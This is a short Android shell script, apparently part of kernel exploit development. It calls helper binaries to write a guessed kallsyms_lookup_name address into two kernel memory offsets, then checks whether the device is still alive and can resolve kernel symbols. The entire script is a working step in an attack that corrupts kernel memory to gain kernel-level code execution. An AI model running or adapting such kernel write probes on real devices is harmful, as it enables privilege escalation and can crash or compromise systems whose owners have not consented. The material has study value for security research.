#!/system/bin/sh
# Retry the two addresses that SURVIVED a write before, now with a VALID
# kernel-function canary (kallsyms_lookup_name guess) and a valid string arg.
D=/data/local/tmp
GW=$D/gaw64
KF=$D/kfunc_new
KLN=ffffffc00111e5d0

for P in 20a57a0 20a77a0; do
  echo "=== write KLN to 0x$P"
  $GW $P $KLN 2>&1 | tail -1
  echo "=== alive check + resolve"
  $KF sym memcpy 2>&1 | tail -1
  $KF sym kallsyms_lookup_name 2>&1 | tail -1
  echo "=== still here"
done
